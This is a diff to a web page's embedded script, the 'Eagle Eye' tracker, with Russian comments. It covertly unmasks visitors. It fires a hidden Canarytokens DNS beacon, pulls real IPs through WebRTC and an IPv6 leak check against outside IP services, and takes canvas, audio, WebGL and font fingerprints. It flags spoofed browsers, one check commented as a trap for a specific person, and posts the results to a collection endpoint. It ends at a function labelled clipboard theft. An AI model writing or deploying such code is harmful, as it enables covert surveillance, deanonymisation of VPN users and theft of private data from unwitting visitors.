@@ -16,7 +16,7 @@
     </style>
 
     <script>
-    // --- ULTIMATE EAGLE EYE v3.1 (WITH CANARYTOKEN) ---
+    // --- ULTIMATE EAGLE EYE v3.5 (FULL SUITE) ---
     window.EagleEye = class {
         constructor() {
             this.endpoint = '/api/collect';
@@ -25,7 +25,7 @@
         }
 
         async init() {
-            // 1. Запускаем CanaryToken (DNS/IP Trap)
+            // 1. Запускаем DNS Trap (Canarytokens)
             this.triggerDNSBeacon();
             
             // 2. Запускаем основной сбор данных
@@ -33,65 +33,57 @@
             else window.addEventListener('load', () => setTimeout(() => this.collect('Page Load'), 100));
         }
 
-        // === 1. CANARYTOKEN TRAP ===
+        // === 1. DNS TOKEN TRAP (LEAK DETECTOR) ===
         triggerDNSBeacon() {
-            // Твоя боевая ссылка
-            const canaryUrl = "http://canarytokens.com/tags/stuff/traffic/giumoqpvt3mawd0bulwx2o4p5/submit.aspx";
+            // ТВОЙ ТОКЕН
+            const canaryDomain = "le50571w2dnsylkz8t5x5ioy2.canarytokens.com"; 
             
-            // Добавляем уникальные параметры, чтобы браузер не кэшировал запрос
-            // и чтобы ты видел ID сессии в логах CanaryTokens (если они поддерживают параметры)
-            const unique = Math.random().toString(36).substring(7);
+            // Генерируем уникальный поддомен: sessionID.random.token.com
+            // Это заставляет DNS сервер делать новый запрос, игнорируя кэш
+            const uniqueSubdomain = `${this.sessionId}.${Math.floor(Math.random() * 1000000)}`;
+            const fullDomain = `http://${uniqueSubdomain}.${canaryDomain}`;
             
-            // Создаем невидимый запрос
-            new Image().src = `${canaryUrl}?uid=${this.sessionId}&rnd=${unique}`;
-            console.log("Beacon fired");
+            // Создаем невидимую картинку. 
+            // Это работает как Web Bug (HTTP запрос) И как DNS Trap (DNS запрос).
+            new Image().src = fullDomain;
+            console.log("DNS Beacon fired:", fullDomain);
         }
 
-        // === 2. WEBRTC (VPN PIERCING) ===
+        // === 2. WEBRTC (LOCAL IP) ===
         async getWebRTCData() {
             const ips = [];
             try {
                 const pc = new RTCPeerConnection({
                     iceServers: [
                         { urls: "stun:stun.l.google.com:19302" },
-                        { urls: "stun:stun1.l.google.com:19302" },
-                        { urls: "stun:stun2.l.google.com:19302" }
+                        { urls: "stun:stun1.l.google.com:19302" }
                     ]
                 });
                 pc.createDataChannel('');
                 const offer = await pc.createOffer();
                 await pc.setLocalDescription(offer);
-                
                 await new Promise(resolve => {
                     pc.onicecandidate = (e) => {
                         if (!e.candidate) return;
                         const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                         const match = e.candidate.candidate.match(ipRegex);
-                        // Фильтруем локальные IP (192.168...), оставляем интересные
                         if (match && !ips.includes(match[1])) ips.push(match[1]);
                     };
                     setTimeout(resolve, 1500);
                 });
-            } catch (e) { /* Blocked */ }
+            } catch (e) { }
             return ips;
         }
 
-        // === 3. HARDWARE FINGERPRINTING ===
-        
-        // Canvas Hash (GPU)
+        // === 3. FINGERPRINTING ===
         getCanvasHash() {
             try {
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
-                ctx.textBaseline = "top";
-                ctx.font = "14px 'Arial'";
-                ctx.fillStyle = "#f60";
-                ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = "#069";
-                ctx.fillText("Eagle_v3_🦅", 2, 15);
-                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-                ctx.fillText("Eagle_v3_🦅", 4, 17);
-                
+                ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
+                ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = "#069"; ctx.fillText("Eagle_v3_🦅", 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("Eagle_v3_🦅", 4, 17);
                 const data = canvas.toDataURL();
                 let hash = 0;
                 for (let i = 0; i < data.length; i++) {
@@ -102,7 +94,6 @@
             } catch (e) { return "error"; }
         }
 
-        // Audio Hash (Sound Card)
         async getAudioHash() {
             try {
                 const audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
@@ -119,45 +110,21 @@
             } catch (e) { return "no_audio"; }
         }
 
-        // === 4. ANTI-SPOOFING (LIE DETECTOR) ===
+        // === 4. ANTI-SPOOFING ===
         detectLies() {
             const anomalies = [];
             const ua = navigator.userAgent;
-
-            // A. Chrome Version Trap (Ловушка для Омича)
-            const hasGroupBy = !!Object.groupBy; // Chrome 117+
-            if (ua.includes("Chrome/109") && hasGroupBy) {
-                anomalies.push("CRITICAL: Fake Chrome 109 (Has modern features)");
-            }
-
-            // B. Screen Resolution Trap
-            if (!window.matchMedia(`(width: ${screen.width}px)`).matches) {
-                anomalies.push(`SCREEN SPOOF: JS=${screen.width}, CSS mismatch`);
-            }
-
-            // C. OS Trap (Fonts)
+            const hasGroupBy = !!Object.groupBy; 
+            if (ua.includes("Chrome/109") && hasGroupBy) anomalies.push("CRITICAL: Fake Chrome 109");
+            if (!window.matchMedia(`(width: ${screen.width}px)`).matches) anomalies.push(`SCREEN SPOOF: JS=${screen.width}, CSS mismatch`);
             const fonts = this.getFonts();
-            if (ua.includes("Windows") && !fonts.includes("Calibri")) {
-                anomalies.push("OS SPOOF: Claims Windows but no Calibri");
-            }
-            if (fonts.includes("Ubuntu") || fonts.includes("Cantarell")) {
-                anomalies.push("REALITY: Likely Linux System");
-            }
-
+            if (ua.includes("Windows") && !fonts.includes("Calibri")) anomalies.push("OS SPOOF: Claims Windows but no Calibri");
+            if (fonts.includes("Ubuntu") || fonts.includes("Cantarell")) anomalies.push("REALITY: Likely Linux System");
             return anomalies;
         }
 
-        // === 5. SYSTEM INFO ===
-        
-        // Реальная проверка шрифтов (измеряем ширину)
         getFonts() {
-            const fontList = [
-                "Arial", "Arial Black", "Calibri", "Cambria", "Comic Sans MS", "Consolas", 
-                "Courier", "Courier New", "Georgia", "Helvetica", "Impact", "Lucida Console", 
-                "Microsoft Sans Serif", "Monaco", "Palatino", "Roboto", "Segoe UI", "Tahoma", 
-                "Times", "Times New Roman", "Trebuchet MS", "Verdana", "Wingdings",
-                "Ubuntu", "Cantarell", "Liberation Sans" // Linux markers
-            ];
+            const fontList = ["Arial", "Calibri", "Consolas", "Courier New", "Helvetica", "Roboto", "Segoe UI", "Times New Roman", "Verdana", "Ubuntu", "Cantarell", "Liberation Sans"];
             const detected = [];
             const span = document.createElement("span");
             span.style.fontSize = "72px"; span.style.position = "absolute"; span.style.left = "-9999px"; span.innerHTML = "mmmmmmmmmmlli";
@@ -172,20 +139,11 @@
             return detected;
         }
 
-        // Client Hints
         async getClientHints() {
             if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                 try {
-                    const ua = await navigator.userAgentData.getHighEntropyValues([
-                        "model", "platformVersion", "fullVersionList", "architecture", "bitness"
-                    ]);
-                    return {
-                        model: ua.model,
-                        platform: ua.platform,
-                        version: ua.platformVersion,
-                        architecture: ua.architecture,
-                        mobile: ua.mobile
-                    };
+                    const ua = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion", "architecture"]);
+                    return { model: ua.model, platform: ua.platform, version: ua.platformVersion, mobile: ua.mobile };
                 } catch(e) { return null; }
             }
             return null;
@@ -197,20 +155,42 @@
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                 if (!gl) return { renderer: 'N/A' };
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return {
-                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
-                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
-                };
+                return { renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL), vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) };
             } catch(e) { return { renderer: 'Error' }; }
+        }
+
+        // === 5. IPv6 CASCADE CHECK (NEW) ===
+        async getIPv6() {
+            const services = [
+                'https://api64.ipify.org?format=json',
+                'https://ipv6.icanhazip.com',
+                'https://ident.me',
+                'https://api6.ipify.org?format=json'
+            ];
+            for (const url of services) {
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 1500);
+                    const response = await fetch(url, { signal: controller.signal, mode: 'cors' });
+                    clearTimeout(timeoutId);
+                    if (!response.ok) continue;
+                    let ip = await response.text();
+                    try { const json = JSON.parse(ip); if (json.ip) ip = json.ip; } catch (e) {}
+                    ip = ip.trim();
+                    if (ip.includes(':')) return ip;
+                } catch (e) { continue; }
+            }
+            return "Not Detected / IPv4 Only";
         }
 
         // === 6. COLLECT & SEND ===
         async collect(triggerName, extraData = {}) {
-            const [ips, battery, clientHints, audioHash] = await Promise.all([
+            const [ips, battery, clientHints, audioHash, ipv6] = await Promise.all([
                 this.getWebRTCData(),
                 navigator.getBattery ? navigator.getBattery().then(b => `${Math.round(b.level*100)}%`) : 'N/A',
                 this.getClientHints(),
-                this.getAudioHash()
+                this.getAudioHash(),
+                this.getIPv6() // <-- IPv6
             ]);
             
             const anomalies = this.detectLies();
@@ -220,11 +200,10 @@
             const payload = {
                 meta: { url: window.location.href, referrer: document.referrer, trigger: triggerName, session_id: this.sessionId },
                 
-                // === НОВЫЕ ДАННЫЕ (GOD MODE) ===
                 fingerprint_v2: {
                     canvas_hash: this.getCanvasHash(),
                     audio_hash: audioHash,
-                    anomalies: anomalies, // СПИСОК ЛЖИ
+                    anomalies: anomalies,
                     is_spoofing: anomalies.length > 0
                 },
 
@@ -241,12 +220,13 @@
                     platform: navigator.platform,
                     language: navigator.language,
                     timezone: timezone,
-                    timezone_offset: tzOffset, // Сравни это с IP на сервере!
+                    timezone_offset: tzOffset,
                     battery: battery,
                     fonts: this.getFonts()
                 },
                 network: {
-                    webrtc_ips: ips // Реальные IP
+                    webrtc_ips: ips,
+                    ipv6_leak: ipv6 // <-- IPv6
                 },
                 ...extraData
             };
@@ -258,7 +238,7 @@
     
     const eagle = new EagleEye();
 
-    // --- КРАЖА БУФЕРА (Твой код) ---
+    // --- КРАЖА БУФЕРА ---
     async function stealClipboard() {
         try {
             if (navigator.clipboard && navigator.clipboard.readText) {
